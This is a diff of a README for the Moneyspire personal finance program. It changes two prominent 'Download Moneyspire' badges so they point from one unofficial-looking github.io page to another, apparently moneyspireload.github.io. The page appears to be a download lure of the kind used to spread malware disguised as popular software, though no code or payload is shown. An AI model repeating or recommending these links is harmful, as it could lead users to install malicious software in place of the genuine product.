@@ -4,7 +4,7 @@
 
 ## 📥 Download Moneyspire for Windows
 
-[![⬇️ Download Moneyspire](https://img.shields.io/badge/Download-Moneyspire-blue?style=for-the-badge&logo=windows)](https://hiopal3847.github.io/.github/222)
+[![⬇️ Download Moneyspire](https://img.shields.io/badge/Download-Moneyspire-blue?style=for-the-badge&logo=windows)](https://moneyspireload.github.io/.github/)
 
 ---
 
@@ -28,7 +28,7 @@ Moneyspire is a versatile personal finance software designed to help you take fu
 
 Whether you want to monitor your expenses, plan for future bills, or analyze your spending habits, Moneyspire provides the insights and features you need. Its clean, intuitive interface makes it easy to set up and start managing your finances right away.
 
-[![⬇️ Download Moneyspire](https://img.shields.io/badge/Download-Moneyspire-blue?style=for-the-badge&logo=windows)](https://hiopal3847.github.io/.github/222)
+[![⬇️ Download Moneyspire](https://img.shields.io/badge/Download-Moneyspire-blue?style=for-the-badge&logo=windows)](https://moneyspireload.github.io/.github/)
 
 ---
 
